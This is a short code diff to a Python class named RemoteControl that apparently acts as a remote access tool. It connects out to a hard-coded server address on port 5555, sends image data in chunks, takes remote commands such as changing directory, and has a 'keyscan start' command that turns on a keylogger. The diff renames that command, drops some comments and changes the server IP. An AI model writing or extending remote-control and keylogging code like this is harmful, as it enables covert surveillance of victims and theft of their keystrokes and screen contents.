@@ -120,9 +120,8 @@ class RemoteControl:
         # Get the bytes data from the stream
         image_data = image_stream.getvalue()
 
-        # Define the chunk size (adjust as needed)
         chunk_size = 1024
-        # Send the image data in chunks
+
         total_sent = 0
         while total_sent < len(image_data):
             chunk = image_data[total_sent:total_sent + chunk_size]  # calculates the ending index for slicing
@@ -167,7 +166,7 @@ class RemoteControl:
                     os.chdir(command[3:])
                     continue
 
-                elif command.startswith('keyscan_start'):
+                elif command.startswith('keyscan start'):
                     self.keylogger_active = True
                     self.active_keylogger_listener = True
                     print("Keylogger started.")
@@ -213,7 +212,7 @@ class RemoteControl:
 
 
 if __name__ == "__main__":
-    server = RemoteControl('192.168.1.231', 5555)
+    server = RemoteControl('192.168.0.0', 5555)
     server.connect_to_server()
 
     main_thread = threading.Thread(target=server.main_loop)
